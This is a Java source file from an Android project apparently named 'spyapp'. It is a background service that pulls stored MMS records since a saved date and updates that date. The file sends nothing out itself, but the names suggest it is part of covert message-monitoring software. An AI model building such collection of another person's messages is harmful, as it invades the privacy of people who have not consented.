package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.MMSModel;
import com.app.spyapp.model.SMSModel;

import java.util.ArrayList;

/**
 * Created by Ankit on 5/29/2016.
 */
public class MMSCallService extends IntentService {

    private SpyApp spyApp;

    public MMSCallService() {
        super(MMSCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<MMSModel> mmsList = spyApp.getDatabaseHelper().getMMSList(spyApp.getSharedPreferences().getString(Pref.MMS_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.MMS_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofMMS()).apply();

    }
}
